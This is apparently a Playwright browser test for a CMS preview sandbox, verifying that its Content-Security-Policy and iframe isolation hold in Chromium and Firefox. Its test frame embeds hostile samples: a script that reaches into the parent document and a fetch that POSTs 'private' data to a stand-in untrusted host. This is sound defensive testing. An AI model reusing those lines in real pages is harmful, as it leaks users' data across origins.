// Exercise the real-document origin/sandbox boundary in both supported browsers.
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import { readFile } from 'node:fs/promises';
import { stripTypeScriptTypes } from 'node:module';
import { chromium, firefox } from 'playwright';
import { previewPolicy } from '../apps/backend/src/cms/preview-policy.ts';

const image = await readFile('apps/staff/public/favicon-96x96.png');
const readiness = stripTypeScriptTypes(await readFile('apps/web/src/lib/private-preview.ts', 'utf8'));
const hits = [];
const server = createServer((request, response) => {
  hits.push(request.url);
  if (request.url === '/readiness') {
    response.setHeader('Content-Type', 'text/html');
    const preview = { context: '00000000-0000-0000-0000-000000000001', generation: 1, parentOrigin: origin };
    response.end(`<!doctype html><meta name="blackbox-preview" content='${JSON.stringify(preview)}'>
      <img loading="lazy" src="/image.png" width="96" height="96">
      <img loading="lazy" src="/offscreen.png" style="position:absolute;top:10000px" width="96" height="96">
      <script type="module">${readiness}\nconnectPrivatePreview();</script>`);
  } else if (request.url === '/readiness-host') {
    response.setHeader('Content-Type', 'text/html');
    response.end(`<!doctype html><script>addEventListener('message', event => {
      if (event.data.type === 'ready') document.documentElement.dataset.ready = 'true';
      if (event.data.type === 'failed') document.documentElement.dataset.failed = event.data.stage;
    });</script><iframe style="visibility:hidden;width:600px;height:400px" src="/readiness"></iframe>`);
  } else if (request.url === '/style.css') {
    response.setHeader('Content-Type', 'text/css');
    response.end('body { background-color: rgb(12, 34, 56); }');
  } else if (request.url === '/image.png') {
    response.setHeader('Content-Type', 'image/png');
    response.end(image);
  } else if (request.url === '/frame') {
    response.writeHead(200, {
      'Content-Type': 'text/html',
      'Content-Security-Policy': previewPolicy(origin),
      'Referrer-Policy': 'no-referrer',
      'Cache-Control': 'private, no-store',
    });
    response.end(
      `<!doctype html><head><link rel="stylesheet" href="/style.css"><link rel="stylesheet" href="https://untrusted.invalid/style.css"></head><body><img src="/image.png"><img src="https://untrusted.invalid/private.png"><script>document.documentElement.dataset.script='ran';try {parent.document.body.dataset.leaked='yes'} catch {document.documentElement.dataset.isolated='yes'};fetch('https://untrusted.invalid/write',{method:'POST',body:'private'}).catch(()=>{});</script><form action="/submitted" method="post"><button>Submit</button></form></body>`,
    );
  } else {
    response.setHeader('Content-Type', 'text/html');
    response.end(
      `<!doctype html><title>Preview security</title><iframe src="http://localhost:${server.address().port}/frame" sandbox="allow-scripts allow-same-origin" referrerpolicy="no-referrer"></iframe>`,
    );
  }
});
await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
const origin = `http://127.0.0.1:${server.address().port}`;
try {
  for (const browserType of [chromium, firefox]) {
    const browser = await browserType.launch();
    try {
      const page = await browser.newPage();
      const forbidden = [];
      await page.route('https://untrusted.invalid/**', (route) => {
        forbidden.push(route.request().url());
        return route.abort();
      });
      await page.goto(origin);
      const frame = page.frames().find((frame) => frame.url().endsWith('/frame'));
      await frame.waitForFunction(() => document.images[0]?.naturalWidth > 0 && document.querySelector('link')?.sheet);
      assert.equal(await frame.evaluate(() => getComputedStyle(document.body).backgroundColor), 'rgb(12, 34, 56)');
      assert.equal(await frame.evaluate(() => document.documentElement.dataset.script), 'ran');
      assert.equal(await frame.evaluate(() => document.documentElement.dataset.isolated), 'yes');
      await frame.getByRole('button', { name: 'Submit' }).click();
      assert.equal(await page.evaluate(() => document.body.dataset.leaked), undefined);
      assert.equal(forbidden.length, 0);
      assert.ok(!hits.includes('/submitted'));
      await page.goto(origin + '/readiness-host');
      await page.waitForFunction(() => document.documentElement.dataset.ready === 'true');
      assert.equal(await page.evaluate(() => document.documentElement.dataset.failed), undefined);
      assert.ok(!hits.includes('/offscreen.png'), 'Offscreen preview images remain lazy');
      console.log(
        `${browserType.name()}: public scripts and assets work; staff DOM, external requests and form delivery are blocked`,
      );
    } finally {
      await browser.close();
    }
  }
} finally {
  await new Promise((resolve) => server.close(resolve));
}
